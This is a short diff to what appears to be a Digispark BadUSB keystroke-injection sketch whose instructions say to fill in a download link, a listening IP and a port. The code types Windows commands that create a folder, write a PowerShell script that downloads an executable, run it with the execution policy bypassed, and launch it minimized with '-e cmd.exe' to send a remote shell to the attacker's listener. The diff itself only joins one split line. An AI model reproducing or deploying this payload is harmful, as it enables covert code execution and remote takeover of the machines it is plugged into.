@@ -16,8 +16,7 @@ Replace LINK with a direct download link, IP with your listening IP, and PORT wi
     DigiKeyboard.print("cmd");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(500);
-    DigiKeyboard.print("cd / & mkdir win & cd win & echo (wget 'LINK' -OutFile a.exe) > b.PS1 
-  & powershell -ExecutionPolicy ByPass -File b.ps1");
+    DigiKeyboard.print("cd / & mkdir win & cd win & echo (wget 'LINK' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(100);
     DigiKeyboard.print("START /MIN a.exe IP PORT -e cmd.exe -d & exit");
